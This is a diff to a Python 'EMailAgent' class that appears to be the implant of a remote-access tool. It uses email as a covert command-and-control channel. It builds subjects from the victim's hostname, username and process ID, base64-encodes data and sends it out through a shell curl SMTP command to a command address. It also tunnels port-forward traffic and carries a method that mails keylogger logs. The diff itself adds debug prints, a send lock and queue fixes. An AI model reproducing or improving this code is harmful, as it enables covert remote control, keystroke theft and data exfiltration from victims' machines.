@@ -55,12 +55,16 @@ class EMailAgent(LocalAgent):
 	curlLock = threading.Lock()
 
 	def pushForward(self, forwardID, data):
+		print("Pushing")
 		if not forwardID in self.forwardQueues:
 			self.forwardQueues[forwardID] = queue.Queue()
+		print("Encoding")
 		im_b64 = base64.b64encode(data).decode('ascii')
-		subject = self.PORTFORWARD_EMAIL_TAG + forwardId + " " + self.buildEmailSubject(self.hostname, self.username, self.pid, self.EMAIL_PROTOCOL_TAG);
+		print("subject forming...")
+		subject = self.PORTFORWARD_EMAIL_TAG + forwardID + " " + self.buildEmailSubject(self.hostname, self.username, self.pid, self.EMAIL_PROTOCOL_TAG);
+		print("Sending")
 		self.sendEmail(subject, im_b64);
-
+		print("Sent")
 
 	def processNextEmail(self):
 		try:
@@ -74,6 +78,9 @@ class EMailAgent(LocalAgent):
 			if(email.subject.startswith(self.PORTFORWARD_EMAIL_TAG)):
 				elements = email.subject.split(" ")
 				print("Forward");
+				forwardID = elements[1]
+				self.forwardQueues[forwardID].put(email.body)
+				print("Forwarded");
 			else:
 				print("Next!");            
 				self.q.put(email.body)
@@ -92,7 +99,9 @@ class EMailAgent(LocalAgent):
 		if self.forwardQueues[forwardID].empty():
 			return None
 		else:
-			return base64.decodebytes(self.forwardQueues[forwardID].get().encode('ascii'))    
+			b64Forward = self.forwardQueues[forwardID].get()
+			print(b64Forward)
+			return base64.decodebytes(b64Forward.encode('ascii'))    
 
 	def buildEmailSubject(self, hostname, username, pid, protocol):
 		return self.HOSTNAME_TAG + ":" + hostname + " " + self.USERNAME_TAG + ":" + username + " " +self.PROTOCOL_TAG + ":" +protocol + " " + self.PID_TAG + ":" + str(pid);
@@ -106,9 +115,14 @@ class EMailAgent(LocalAgent):
 		f.write("Subject: " + subject + "\n\n")
 		f.write(body)    
 		f.close()
-        
+
+		print("Locking for send")
+		self.curlLock.acquire()
 		sendEmailCommand = "curl --url " + self.EMAIL_OUTGOING_URL + " --user " + self.EMAIL_OUTGOING_USERNAME + ":" + self.EMAIL_OUTGOING_PASSWORD + " --mail-from " + self.EMAIL_OUTGOING_USERNAME + " --mail-rcpt " + self.EMAIL_CMD_ADDR + " --upload-file " + self.OUTGOING_EMAIL_TMP_FILENAME
+		print("Sending")
 		sendEmailResponse = subprocess.Popen(sendEmailCommand, shell=True, stdout=subprocess.PIPE).stdout.read().decode("utf-8")
+		self.curlLock.release()
+		print("Releasing send")
 		os.remove(self.OUTGOING_EMAIL_TMP_FILENAME)
 
 	def postResponse(self, cmd_output):
@@ -161,7 +175,7 @@ class EMailAgent(LocalAgent):
 		return SimpleEmail(sender, subject, body);    
     
 	def pollServer(self):
-		
+		"""
 		try:
 			email = self.getNextEmail()
 			return email.body
@@ -175,7 +189,7 @@ class EMailAgent(LocalAgent):
 			return "<control> No Command"
 		else:
 			return self.q.get()
-		"""
+		
 
 	def postKeylogger(self, log):
 		subject = "Keylogger: " + self.buildEmailSubject(self.hostname, self.username, self.pid, self.EMAIL_PROTOCOL_TAG)
